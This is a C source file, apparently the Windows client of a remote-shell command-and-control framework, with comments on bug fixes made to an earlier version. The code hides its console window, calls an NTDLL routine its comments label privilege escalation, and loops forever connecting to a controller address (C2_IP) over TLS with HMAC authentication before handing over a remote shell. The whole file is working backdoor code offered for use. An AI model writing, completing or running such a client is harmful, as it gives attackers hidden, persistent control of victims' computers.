/*
 * client/main.c  –  WinMain entry point for the remote shell client
 * ==================================================================
 * Responsibilities:
 *   1. Enforce single-instance via a named mutex.
 *   2. Load NTDLL syscall pointers (ntcalls_load / ntcalls_verify).
 *   3. Hide the console window.
 *   4. Initialise Winsock 2.2.
 *   5. Load the 32-byte HMAC shared secret from disk.
 *   6. Loop forever: TCP connect → TLS + HMAC + v2 handshake → shell loop.
 *      On any failure, clean up and retry after RECONNECT_DELAY_SEC.
 *
 * Fixes applied (vs. the original monolithic Source.c)
 * -----------------------------------------------------
 *   • CreateMutexA() was passed L"consoleShell" (wide literal) — type
 *     mismatch with the ANSI variant; now a plain narrow string literal.
 *   • WSAStartup MAKEWORD(2,0) → MAKEWORD(2,2) (2.0 is insufficient for
 *     the full Winsock 2 API surface used by TLS and DNS).
 *   • LoadLibraryW return value now checked for NULL.
 *   • GetConsoleWindow() return value now NULL-guarded before ShowWindow.
 */

#include "config.h"
#include "ntcalls.h"
#include "shell.h"
#include "../tls/tls_client.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <Windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <string.h>


/* ── Load the 32-byte HMAC key from disk ────────────────────────────────── */
/*                                                                            */
/*  Matches megaploit.core.crypto.load_key():                                 */
/*    secret.key contains 64 ASCII hex characters (no newline required).      */
/*    This function hex-decodes them to 32 raw bytes.                         */
/*                                                                            */
/*  Generate with:                                                            */
/*    python -c "import os,binascii;                                          */
/*        open('secret.key','wb').write(binascii.hexlify(os.urandom(32)))"   */

static BOOL load_secret_key(const char *path, BYTE key[SECRET_KEY_LEN])
{
    FILE *f = fopen(path, "rb");
    if (!f) return FALSE;

    /* 64 hex chars + optional whitespace + safety margin */
    char hex[68] = {0};
    size_t n = fread(hex, 1, sizeof(hex) - 1, f);
    fclose(f);

    /* Strip trailing whitespace / newlines */
    while (n > 0 && (hex[n-1] == '\n' || hex[n-1] == '\r' ||
                      hex[n-1] == ' '  || hex[n-1] == '\t'))
        hex[--n] = '\0';

    if (n != 64) return FALSE;   /* must be exactly 64 hex digits */

    for (int i = 0; i < 32; i++) {
        char hi = hex[i * 2];
        char lo = hex[i * 2 + 1];
        BYTE h, l;

        if      (hi >= '0' && hi <= '9') h = (BYTE)(hi - '0');
        else if (hi >= 'a' && hi <= 'f') h = (BYTE)(hi - 'a' + 10);
        else if (hi >= 'A' && hi <= 'F') h = (BYTE)(hi - 'A' + 10);
        else return FALSE;

        if      (lo >= '0' && lo <= '9') l = (BYTE)(lo - '0');
        else if (lo >= 'a' && lo <= 'f') l = (BYTE)(lo - 'a' + 10);
        else if (lo >= 'A' && lo <= 'F') l = (BYTE)(lo - 'A' + 10);
        else return FALSE;

        key[i] = (BYTE)((h << 4) | l);
    }
    return TRUE;
}


/* ── WinMain ────────────────────────────────────────────────────────────── */

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
                     LPCSTR lpCmdLine, int nCmdShow)
{
    (void)hInstance; (void)hPrev; (void)lpCmdLine; (void)nCmdShow;

    /* ── 1. Single-instance guard ─────────────────────────────────────── */
    /* FIX: was CreateMutexA(NULL, NULL, L"consoleShell")
     *      L"..." is a wide-char literal — wrong type for the A variant.
     *      Second arg changed from NULL to FALSE (bInitialOwner).         */
    CreateMutexA(NULL, FALSE, "consoleShell");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    /* ── 2. NT syscall pointers ──────────────────────────────────────── */
    if (!ntcalls_load()) return 0x02;  /* ntdll.dll not found — fatal     */
    ntcalls_verify();                  /* privilege escalation; non-fatal */

    /* ── 3. Hide the console window ────────────────────────────── */
    AllocConsole();
    HWND hConsole = GetConsoleWindow();
    if (hConsole) ShowWindow(hConsole, SW_HIDE);

    /* ── 4. Winsock 2.2 ─────────────────────────────────────────
     * FIX: was MAKEWORD(2, 0).  Version 2.2 is required for the
     * full socket API used by SChannel and ws2tcpip helpers.    */
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 0x03;

    /* ── 5. Load shared secret ──────────────────────────────────── */
    BYTE secretKey[SECRET_KEY_LEN];
    if (!load_secret_key(SECRET_KEY_PATH, secretKey)) {
        WSACleanup();
        return 0x01;
    }

    /* ── 6. Reconnect loop ──────────────────────────────────────── */
    while (1) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            Sleep(RECONNECT_DELAY_SEC * 1000);
            continue;
        }

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family      = AF_INET;
        addr.sin_addr.s_addr = inet_addr(C2_IP);
        addr.sin_port        = htons(C2_PORT);

        /* Retry TCP connect until the C2 is reachable */
        while (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0)
            Sleep(RECONNECT_DELAY_SEC * 1000);

        /* TLS handshake + HMAC auth + protocol v2 negotiation */
        TLS_CONTEXT tls;
        ZeroMemory(&tls, sizeof(tls));
        if (!tls_connect(&tls, sock, C2_IP, secretKey)) {
            closesocket(sock);
            Sleep(RECONNECT_DELAY_SEC * 1000);
            continue;
        }

        /* Shell command loop — blocks until disconnected */
        shell_run(&tls);

        /* Clean up before next reconnect attempt */
        tls_disconnect(&tls);
        closesocket(sock);
        Sleep(RECONNECT_DELAY_SEC * 1000);
    }

    /* Unreachable; here as a safety net */
    SecureZeroMemory(secretKey, sizeof(secretKey));
    WSACleanup();
    return 0;
}
